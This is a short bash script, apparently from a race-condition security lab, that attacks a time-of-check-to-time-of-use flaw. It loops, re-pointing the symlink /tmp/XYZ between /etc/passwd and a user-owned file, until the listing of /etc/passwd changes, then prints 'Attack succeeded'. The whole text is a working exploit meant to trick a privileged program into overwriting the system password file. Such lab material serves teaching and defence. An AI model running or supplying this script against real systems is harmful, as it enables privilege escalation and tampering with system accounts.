#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

while [ "$old" == "$new" ]
do
    ln -sf /etc/passwd /tmp/XYZ
    ln -sf /tmp/XXX /tmp/XYZ
    new=$($CHECK_FILE)
done
echo "STOP... Attack succeeded"
